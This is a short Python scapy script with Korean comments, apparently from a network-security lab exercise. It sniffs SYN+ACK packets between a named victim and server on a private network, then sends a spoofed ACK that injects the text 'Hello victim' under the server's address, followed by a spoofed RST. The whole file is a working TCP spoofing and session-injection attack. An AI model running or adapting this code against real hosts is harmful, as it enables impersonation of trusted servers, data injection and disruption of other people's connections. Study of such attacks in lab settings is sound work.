from scapy.all import *
import time
x_ip = "10.9.0.5" # 피해자 IP 주소
x_port = 9090 # 피해자 포트
srv_ip = "10.9.0.69" # 서버의 IP 주소
srv_port = 8000 # 서버 포트
syn_seq = 0x1000 # 공격자가 사용할 TCP 시퀀스 번호

def spoof(pkt): # 스푸핑 함수
    old_tcp = pkt[TCP] # 스니핑한 패킷을 받아 처리
    if old_tcp.flags == 'SA': # 플래그가 'SA' (SYN+ACK)인 패킷만 처리
        ip = IP(src = srv_ip, dst = x_ip) # src를 서버 IP로, dst를 희생자 IP로 설정
        tcp = TCP(sport = srv_port, dport = x_port, # sport: 서버 포트, dport: 희생자의 포트
                  seq = syn_seq +1, # seq: 공격자가 사용할 시퀀스 번호로 설정
                  ack = old_tcp.seq +1, # ack: 서버가 보낸 SYN+ACK에 대한 응답
                  flags = "A") # flags: "A" (ACK)로 설정
        data = 'Hello victim\n'
        send(ip/tcp/data, verbose=0, iface='eth0')

        time.sleep(2) # 2초 대기 후 TCP 플래그를 "R" (Reset)로 설정
        tcp.flags = "R"
        tcp.seq = syn_seq + 1 + len(data) # 시퀀스 번호는 이전 시퀀스 번호에서 보낸
        send(ip/tcp, verbose = 0) #  데이터의 길이(len(data))만큼 증가

f = 'tcp and src host {} and src port {} and dst host {} and dst port {}'
myFilter = f.format(x_ip, x_port, srv_ip, srv_port) # 희생자와 서버 간의 TCP 패킷만 스니핑
sniff(iface='eth0', filter=myFilter, prn = spoof)
# 네트워크 인터페이스 eth0에서 패킷을 가로채고, 가로챈 패킷을 spoof 함수로 전달